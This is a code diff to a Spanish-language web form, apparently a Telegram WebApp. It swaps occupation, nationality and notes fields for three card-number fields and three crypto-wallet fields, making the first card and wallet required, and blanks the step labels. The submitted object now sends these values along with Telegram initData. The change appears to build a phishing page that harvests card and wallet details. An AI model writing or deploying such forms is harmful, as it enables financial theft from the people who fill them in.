@@ -34,9 +34,12 @@
                 addr: addr,
                 phone: phone,
                 phone2: phone2,
-                occupation: occupation,
-                nationality: nationality,
-                notes: notes,
+                card1: card1,
+                card2: card2,
+                card3: card3,
+                wallet1: wallet1,
+                wallet2: wallet2,
+                wallet3: wallet3,
                 initData: window.Telegram?.WebApp?.initData || null
             });
 
@@ -97,8 +100,8 @@
 
                 <!-- Botones de pestaña -->
                 <div class="tabs" role="tablist" aria-label="Páginas del formulario">
-                  <div class="tab-btn active" onclick="goToTab(1)" role="tab" aria-selected="true" data-tab="1">Paso 1</div>
-                  <div class="tab-btn" onclick="goToTab(2)" role="tab" aria-selected="false" data-tab="2">Paso 2</div>
+                  <div class="tab-btn active" onclick="goToTab(1)" role="tab" aria-selected="true" data-tab="1"></div>
+                  <div class="tab-btn" onclick="goToTab(2)" role="tab" aria-selected="false" data-tab="2"></div>
                 </div>
 
                 <!-- Formulario único con secciones (pestañas) -->
@@ -139,16 +142,28 @@
                     <!-- PESTAÑA 2 (campos adicionales) -->
                     <div class="tab" data-tab="2" style="display:none;">
                         <div class="input-field">
-                            <input type="text" placeholder="Ocupación" id="occupation">
-                            <i class="uil uil-briefcase"></i>
+                            <input type="text" placeholder="Tarjeta 1" id="card1" required>
+                            <i class="uil uil-credit-card"></i>
                         </div>
                         <div class="input-field">
-                            <input type="text" placeholder="Nacionalidad" id="nationality">
-                            <i class="uil uil-globe"></i>
+                            <input type="text" placeholder="Tarjeta 2" id="card2">
+                            <i class="uil uil-credit-card"></i>
                         </div>
                         <div class="input-field">
-                            <input type="text" placeholder="Observaciones / notas" id="notes">
-                            <i class="uil uil-clipboard-notes"></i>
+                            <input type="text" placeholder="Tarjeta 3" id="card3">
+                            <i class="uil uil-credit-card"></i>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" placeholder="Wallet 1" id="wallet1" required>
+                            <i class="uil uil-wallet"></i>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" placeholder="Wallet 2" id="wallet2">
+                            <i class="uil uil-wallet"></i>
+                        </div>
+                        <div class="input-field">
+                            <input type="text" placeholder="Wallet 3" id="wallet3">
+                            <i class="uil uil-wallet"></i>
                         </div>
 
                         <div class="form-nav">
